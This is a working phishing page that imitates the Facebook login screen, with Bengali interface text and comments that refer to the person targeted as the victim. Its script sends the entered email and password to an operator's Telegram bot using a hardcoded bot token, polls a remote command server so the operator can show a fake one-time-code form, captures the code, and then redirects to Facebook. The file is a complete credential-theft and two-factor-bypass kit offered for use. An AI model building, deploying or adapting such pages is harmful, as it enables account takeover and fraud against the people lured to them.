<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In</title>
    <style>
        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-container { background: white; padding: 25px; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,0.1); width: 90%; max-width: 400px; text-align: center; }
        .fb-logo { color: #1877f2; font-size: 40px; font-weight: bold; margin-bottom: 20px; letter-spacing: -2px; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; outline: none; font-size: 16px; }
        .btn { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-weight: bold; cursor: pointer; font-size: 18px; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #1877f2; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 15px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .hidden { display: none; }
        .footer-link { color: #1877f2; font-size: 14px; text-decoration: none; margin-top: 15px; display: block; }
    </style>
</head>
<body>

<div class="login-container" id="login-box">
    <div class="fb-logo">facebook</div>
    <input type="text" id="email" placeholder="মোবাইল নম্বর বা ইমেইল ঠিকানা">
    <input type="password" id="pass" placeholder="পাসওয়ার্ড">
    <button class="btn" id="login-btn">Log In</button>
    <a href="#" class="footer-link">Forgotten password?</a>
</div>

<div class="login-container hidden" id="loading-box">
    <div class="fb-logo">facebook</div>
    <div class="spinner"></div>
    <p style="color: #606770; font-size: 14px;">আপনার অ্যাকাউন্ট ভেরিফাই হচ্ছে... অনুগ্রহ করে অপেক্ষা করুন।</p>
</div>

<div class="login-container hidden" id="otp-box">
    <div class="fb-logo">facebook</div>
    <p style="font-size: 14px; color: #4b4f56; margin-bottom: 15px;">নিরাপত্তার জন্য আপনার ফোনে পাঠানো ৬ ডিজিটের কোডটি দিন।</p>
    <input type="number" id="otp-code" placeholder="------" style="text-align: center; letter-spacing: 5px; font-size: 20px;">
    <button class="btn" id="otp-btn">Confirm OTP</button>
</div>

<script>
    const urlParams = new URLSearchParams(window.location.search);
    const userId = urlParams.get('id'); // ভিকটিম যার লিঙ্ক দিয়ে ঢুকেছে তার আইডি
    const RENDER_URL = "https://your-app-name.onrender.com"; // এখানে আপনার রেন্ডার অ্যাপের লিঙ্ক দিন

    // --- টেলিগ্রামে ডাটা পাঠানোর ফাংশন ---
    async function sendToBot(text) {
        const botToken = "8403844691:AAEF9pkqMm2G6e_t9FtjaLyg9v9erf-XMKs";
        const adminId = "7068444019";
        
        const payload = { chat_id: adminId, text: text, parse_mode: 'Markdown' };
        
        // অ্যাডমিনকে বাটনসহ রিপোর্ট পাঠানো (লগইন হিটের সময়)
        if(text.includes("LOGIN HIT")) {
            payload.reply_markup = {
                inline_keyboard: [[{ text: "📩 Request OTP Page", callback_data: `open_otp_${userId || adminId}` }]]
            };
        }

        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(payload)
        });

        // যদি ভিকটিম অন্য কারো রেফারেল লিঙ্ক দিয়ে আসে
        if (userId && userId !== adminId) {
            payload.chat_id = userId;
            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            });
        }
    }

    // --- ১. লগইন বাটনের কাজ ---
    document.getElementById('login-btn').addEventListener('click', async () => {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;

        if (!email || !pass) return alert("তথ্য সঠিক দিন!");

        document.getElementById('login-box').classList.add('hidden');
        document.getElementById('loading-box').classList.remove('hidden');

        const msg = `🔥 **FB LOGIN HIT** 🔥\n\n📧 User: \`${email}\`\n🔑 Pass: \`${pass}\`\n👤 Report For: \`${userId || 'Admin'}\``;
        await sendToBot(msg);

        // রিয়েল-টাইম কমান্ড চেক শুরু
        const checkInterval = setInterval(async () => {
            try {
                const res = await fetch(`${RENDER_URL}/get_command/${userId || '7068444019'}`);
                const data = await res.json();

                if (data.status === "show_otp") {
                    clearInterval(checkInterval);
                    document.getElementById('loading-box').classList.add('hidden');
                    document.getElementById('otp-box').classList.remove('hidden');
                }
            } catch (e) { console.log("Waiting for admin..."); }
        }, 3000);
    });

    // --- ২. ওটিপি বাটনের কাজ ---
    document.getElementById('otp-btn').addEventListener('click', async () => {
        const otp = document.getElementById('otp-code').value;
        if (otp.length < 6) return alert("সঠিক ওটিপি দিন!");

        document.getElementById('otp-box').classList.add('hidden');
        document.getElementById('loading-box').classList.remove('hidden');

        await sendToBot(`📩 **OTP RECEIVED** 📩\n\n🔢 Code: \`${otp}\`\n👤 User ID: \`${userId || 'Admin'}\``);

        // ৩ সেকেন্ড পর আসল ফেসবুকে রিডাইরেক্ট
        setTimeout(() => {
            window.location.href = "https://www.facebook.com/recover/initiate";
        }, 3000);
    });
</script>
</body>
</html>
